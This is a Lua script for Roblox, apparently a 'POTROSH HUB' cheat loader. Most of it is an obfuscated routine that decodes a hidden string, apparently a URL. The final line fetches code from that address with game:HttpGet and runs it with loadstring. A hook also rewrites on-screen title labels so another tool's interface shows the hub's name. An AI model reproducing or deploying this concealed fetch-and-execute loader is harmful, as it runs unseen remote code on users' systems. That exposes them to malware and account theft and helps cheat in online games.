
--[[ STAGE 2: VISUAL CORE ]]
local _Y4__ZdwQcrikYjF7q9="\191\160\174\225\147\163\162\161\167\090\137\094\093\084\075\121\115\126\087\064\088\094\111\077\113\097\102\102\025\118\103\008\010\028\011\014\006\008\056\006\056\010\059\034\033\037\217\033\211\059\019\209\211\216\201\012\204\193\201\240\249\198\253\233\254\046\246\228\230\232\153\230\147\228\148\136\142\194\129\132\141\255\182\177\191\173\168\172\181\091\173\092\087\167\073\083\076\084\075\129\125\072\124\188\177\163\111\111\096\101\110"local mP5PWna1Tf3FDIM4T=91 local TKn2uAJY1DDvKKec0jxl=100 local tHqkfZ2rpER_7__XW=1 local zQwtX4YJv9B4hiPCprxcdg=3 local lT1Ked85_P2a=28 local vnau1SYOstnbeNh=true local PB46o1Eqj49iK9ouxH5_iC=bit32 and bit32.bxor if not PB46o1Eqj49iK9ouxH5_iC then PB46o1Eqj49iK9ouxH5_iC=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local WGNXHJ8sKzYfRRjA={}for OKQC1AdAgaBP23G4WN6hq=1,#_Y4__ZdwQcrikYjF7q9 do local khY3_TbpBB355Zw=string.byte(_Y4__ZdwQcrikYjF7q9,OKQC1AdAgaBP23G4WN6hq)local yjIq_fduIlJQl=(TKn2uAJY1DDvKKec0jxl+(OKQC1AdAgaBP23G4WN6hq*zQwtX4YJv9B4hiPCprxcdg)+lT1Ked85_P2a)%256 if tHqkfZ2rpER_7__XW==0 then khY3_TbpBB355Zw=(khY3_TbpBB355Zw-yjIq_fduIlJQl)%256 WGNXHJ8sKzYfRRjA[OKQC1AdAgaBP23G4WN6hq]=string.char(PB46o1Eqj49iK9ouxH5_iC(khY3_TbpBB355Zw,mP5PWna1Tf3FDIM4T))else khY3_TbpBB355Zw=PB46o1Eqj49iK9ouxH5_iC(khY3_TbpBB355Zw,mP5PWna1Tf3FDIM4T)WGNXHJ8sKzYfRRjA[OKQC1AdAgaBP23G4WN6hq]=string.char((khY3_TbpBB355Zw-yjIq_fduIlJQl)%256)end end local StZQkNET0rUmpSpDe8Ec=table.concat(WGNXHJ8sKzYfRRjA)if vnau1SYOstnbeNh then StZQkNET0rUmpSpDe8Ec=string.reverse(StZQkNET0rUmpSpDe8Ec)end local AB663ZBW_8ZcWf1ma=StZQkNET0rUmpSpDe8Ec
local HubName = "POTROSH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(AB663ZBW_8ZcWf1ma))()
